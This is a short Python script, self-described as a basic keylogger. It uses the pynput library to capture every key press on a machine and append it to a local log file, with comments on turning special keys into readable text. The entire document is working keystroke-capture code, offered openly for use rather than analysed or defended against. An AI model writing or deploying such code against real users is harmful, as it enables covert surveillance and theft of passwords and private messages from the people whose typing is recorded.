# This is a basickeylogger.

from pynput.keyboard import Listener

def log_keystroke(key):
    # convert the key into a string and remove all the single quotes so that it is easier for us to read the log file
    key = str(key).replace("'", "") 

    # we will encounter ‘Key.space’ & ‘Key.enter’ instead of an actual space and automatic next line shift and ‘Key.shift_r’ when using the shift key
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == 'Key.enter':
        key = '\n'

    # write to log file
    with open("log.txt", 'a') as f:
        f.write(key)

# et up an instance of Listener and define the log_keystroke method in it and then join the instance to the main thread
with Listener(on_press = log_keystroke) as l:
    l.join()